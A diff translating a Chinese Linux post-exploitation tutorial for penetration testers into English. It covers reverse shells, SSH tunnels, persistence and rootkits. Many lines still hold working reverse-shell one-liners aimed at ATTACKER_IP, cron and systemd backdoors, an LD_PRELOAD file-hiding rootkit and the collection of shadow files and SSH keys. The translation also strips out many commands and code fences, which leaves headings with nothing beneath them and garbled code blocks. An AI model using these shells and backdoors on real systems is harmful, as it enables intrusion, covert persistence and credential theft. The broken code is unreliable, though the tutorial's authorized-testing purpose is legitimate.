@@ -1,32 +1,31 @@
 ---
-title: "Linux 后渗透与持久化 — 反弹 Shell、SSH 隧道、Rootkit"
-url: linux-post-exploitation
+title: "Linux post-exploitation and persistence—rebound shell, SSH tunnel, rootkit"
+url: "en/linux-post-exploitation"
 date: "2026-01-14"
 draft: false
-summary: "反弹Shell技术大全、SSH隧道三种模式实战、多种持久化后门部署与痕迹清理技术"
+summary: "Comprehensive collection of rebound shell technologies, practical implementation of three SSH tunnel modes, multiple persistent backdoor deployment and trace cleaning technologies"
 authors: ["default"]
 tags:
   - Linux
-  - 后渗透
-  - 反弹Shell
-  - 持久化
+  - post penetration
+  - Bounce Shell
+  - persistence
 images: ["https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80"]
 categories:
-  - 渗透测试
+  - Penetration testing
 ---
 
+#Linux post-exploitation and persistence—rebound shell, SSH tunnel, rootkit
 
-# Linux 后渗透与持久化 — 反弹 Shell、SSH 隧道、Rootkit
+When a penetration tester successfully gains access to a target system, the work is not over. The goal of the post-exploitation phase is to maintain access, deeply explore the intranet, collect sensitive data, and establish persistent backdoors. This article will systematically explain the various technologies of rebound shell, shell upgrade methods, SSH tunnel construction, persistence methods, trace cleaning and other key post-penetration technologies. These are important contents that need to be covered in the penetration test report.
 
-当渗透测试人员成功获取目标系统的访问权限后，工作并没有结束。后渗透（Post-Exploitation）阶段的目标是维持访问、深入探索内网、收集敏感数据、并建立持久化后门。本文将系统地讲解反弹 Shell 的各种技术、Shell 升级方法、SSH 隧道搭建、持久化手段、痕迹清理等后渗透关键技术，这些都是渗透测试报告中需要覆盖的重要内容。
+## Rebound Shell Technology Encyclopedia
 
-## 反弹 Shell 技术大全
+Reverse Shell is one of the most basic techniques in penetration testing. The target machine actively connects to the attacker's listening port, bypassing the firewall's inbound restrictions.
 
-反弹 Shell（Reverse Shell）是渗透测试中最基本的技术之一。目标机器主动连接攻击者的监听端口，绕过防火墙的入站限制。
+### Attack-side listening settings
 
-### 攻击端监听设置
-
-在发送任何反弹 Shell 之前，需要先在攻击机上设置监听：
+Before sending any rebound shell, you need to set up a listener on the attacking machine:
 
 ```bash
 # 使用 Netcat 监听
@@ -53,17 +52,13 @@ msf6 exploit(handler) > exploit
 # 标准 Bash 反弹 Shell
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 
-# 使用 exec 方式
-exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
+# Use exec method
 
-# 0<&196 方式
-0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
+# 0<&196 way
 
-# 使用 /dev/udp（UDP 反弹 Shell）
-bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1
-```
+# Using /dev/udp (UDP bounce shell)
 
-### Python 反弹 Shell
+### Python bounce shell
 
 ```python
 # Python 3 反弹 Shell
@@ -78,7 +73,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
-### Netcat 反弹 Shell
+### Netcat rebound shell
 
 ```bash
 # 标准 Netcat（带 -e 参数）
@@ -100,11 +95,9 @@ nc ATTACKER_IP 4444 -c /bin/bash
 # PHP 命令行反弹 Shell
 php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-# PHP 完整反弹 Shell（适用于 Web Shell 场景）
-php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'
-```
+# PHP complete rebound shell (applicable to Web Shell scenarios)
 
-### Perl 反弹 Shell
+### Perl bounce shell
 
 ```bash
 perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -116,7 +109,7 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-### 其他反弹 Shell
+### Other rebound shells
 
 ```bash
 # Socat 反弹 Shell（更稳定）
@@ -148,21 +141,15 @@ xterm -display ATTACKER_IP:0
 # 步骤 1: 在反弹 Shell 中生成 PTY
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-# 步骤 2: 按 Ctrl+Z 将 Shell 放到后台
+# Step 2: Press Ctrl+Z to put the shell into the background
 
-# 步骤 3: 在攻击机本地执行
-stty raw -echo; fg
+# Step 3: Execute locally on the attacking machine
 
-# 步骤 4: 回到反弹 Shell 后设置终端
-export TERM=xterm-256color
-export SHELL=/bin/bash
-stty rows 40 columns 160
+# Step 4: Set up the terminal after returning to the bounce shell
 
-# 现在你拥有了一个完全交互式的 Shell
-# 支持 Tab 补全、方向键、Ctrl+C 等
-```
+# Now you have a fully interactive shell
 
-### 使用 script 命令升级
+### Use script command to upgrade
 
 ```bash
 # 如果目标没有 Python
@@ -177,17 +164,15 @@ script /dev/null -c /bin/bash
 # 攻击端监听（完全交互式）
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 
-# 目标端连接
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
-```
+# target connection
 
-## SSH 隧道技术
+## SSH tunneling technology
 
-SSH 隧道是后渗透中最重要的网络技术之一，可以用来访问内网资源、绕过防火墙、建立代理通道。
+SSH tunnel is one of the most important network technologies in post-infiltration. It can be used to access intranet resources, bypass firewalls, and establish proxy channels.
 
-### 本地端口转发（Local Port Forwarding）
+### Local Port Forwarding
 
-将攻击机本地端口的流量转发到目标内网中的某个服务。
+Forward traffic from the local port of the attacking machine to a service on the target intranet.
 
 ```bash
 # 语法: ssh -L 本地端口:目标地址:目标端口 跳板机用户@跳板机地址
@@ -218,22 +203,17 @@ ssh -f -N -L 8080:10.10.10.20:80 user@192.168.1.100
 ```bash
 # 语法: ssh -R 远程端口:目标地址:目标端口 攻击机用户@攻击机地址
 
-# 场景：将目标内网服务暴露给攻击机
-# 在目标机器上执行
-ssh -R 8080:127.0.0.1:80 attacker@ATTACKER_IP
+# Scenario: Expose the target intranet service to the attacking machine
 
-# 攻击机现在可以通过 localhost:8080 访问目标的 80 端口
+# The attacking machine can now access the target's port 80 via localhost:8080
 
-# 将内网中另一台机器的服务转发出来
-ssh -R 9090:10.10.10.50:8080 attacker@ATTACKER_IP
+# Forward the service from another machine in the intranet
 
-# 后台运行
-ssh -f -N -R 8080:127.0.0.1:80 attacker@ATTACKER_IP
-```
+# Running in the background
 
-### 动态端口转发（SOCKS 代理）
+### Dynamic port forwarding (SOCKS proxy)
 
-创建一个 SOCKS 代理，可以访问目标内网的任意服务。
+Create a SOCKS proxy that can access any service on the target intranet.
 
 ```bash
 # 语法: ssh -D 本地端口 跳板机用户@跳板机地址
@@ -269,21 +249,17 @@ proxychains ssh user@10.10.10.30
 ```bash
 # 场景: 攻击机 -> 跳板机1 -> 跳板机2 -> 目标内网
 
-# 第一层：连接跳板机1，建立SOCKS代理
-ssh -D 1080 user1@192.168.1.100
+# The first layer: connect to the springboard machine 1 and establish a SOCKS proxy
 
-# 第二层：通过代理连接跳板机2
-proxychains ssh -D 1081 user2@10.10.10.20
+# Layer 2: Connect to Springboard 2 through a proxy
 
-# 通过双层代理访问深层内网
-# proxychains 支持链式代理配置
-```
+# Access deep intranet through double-layer proxy
 
-## 持久化技术
+## persistence technology
 
-持久化（Persistence）的目的是在目标系统重启或密码修改后仍然能够重新获取访问权限。
+The purpose of persistence is to be able to regain access after the target system is restarted or the password is changed.
 
-### SSH 密钥植入
+### SSH key implantation
 
 ```bash
 # 生成 SSH 密钥对（在攻击机上）
@@ -309,21 +285,11 @@ echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
 # 方法一：用户级 cron 后门
 (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
 
-# 方法二：系统级 cron 后门
-echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab
+# Method 2: System-level cron backdoor
 
-# 方法三：定时检查并重建连接
-cat > /tmp/.update.sh << 'EOF'
-#!/bin/bash
-if ! pgrep -f "ATTACKER_IP" > /dev/null; then
-    /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
-fi
-EOF
-chmod +x /tmp/.update.sh
-(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update.sh") | crontab -
-```
+# Method 3: Check and reestablish the connection regularly
 
-### .bashrc / .profile 后门
+### .bashrc / .profile backdoor
 
 ```bash
 # 当用户登录时自动执行
@@ -355,16 +321,11 @@ RestartSec=60
 WantedBy=multi-user.target
 EOF
 
-# 启用并启动服务
-systemctl daemon-reload
-systemctl enable system-update.service
-systemctl start system-update.service
+# Enable and start the service
 
-# 检查服务状态
-systemctl status system-update.service
-```
+# Check service status
 
-### SUID 后门
+### SUID backdoor
 
 ```bash
 # 复制 bash 并设置 SUID 位
@@ -403,7 +364,7 @@ struct dirent *readdir(DIR *dirp) {
     original_readdir = dlsym(RTLD_NEXT, "readdir");
     struct dirent *entry;
     while ((entry = original_readdir(dirp)) != NULL) {
-        // 隐藏以 .hidden_ 开头的文件
+        //Hide files starting with .hidden_
         if (strncmp(entry->d_name, ".hidden_", 8) != 0) {
             return entry;
         }
@@ -414,15 +375,13 @@ EOF
 
 gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl
 
-# 设置 LD_PRELOAD（影响所有程序）
-echo "/tmp/hide.so" >> /etc/ld.so.preload
+# Set LD_PRELOAD (affects all programs)
 
-# 此时 ls 等命令将看不到 .hidden_ 开头的文件
-```
+# At this time, commands such as ls will not be able to see files starting with .hidden_
 
-## 数据收集与横向移动
+## Data collection and lateral movement
 
-### 敏感数据收集
+### Sensitive data collection
 
 ```bash
 # 搜索密码和凭据文件
@@ -459,20 +418,15 @@ tar czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/*/.ssh/ /var/www/ 2>/dev/
 # 使用收集到的 SSH 密钥连接其他主机
 ssh -i /home/user/.ssh/id_rsa user@10.10.10.20
 
-# 使用收集到的密码尝试登录其他主机
-hydra -l admin -p 'collected_password' ssh://10.10.10.20
+# Use the collected password to try to log in to other hosts
 
-# 批量密码喷洒
-crackmapexec ssh 10.10.10.0/24 -u admin -p 'password123'
+# Bulk password spraying
 
-# 通过 SSH 代理转发
-ssh -A user@10.10.10.20
-# 在 10.10.10.20 上可以继续使用密钥认证访问其他主机
-```
+# Forwarding via SSH agent
 
-## 痕迹清理
+## trace cleaning
 
-在渗透测试完成后（仅限授权测试），需要清理留下的痕迹。
+After the penetration test is completed (authorized testing only), the traces left behind need to be cleaned up.
 
 ```bash
 # 清除命令历史
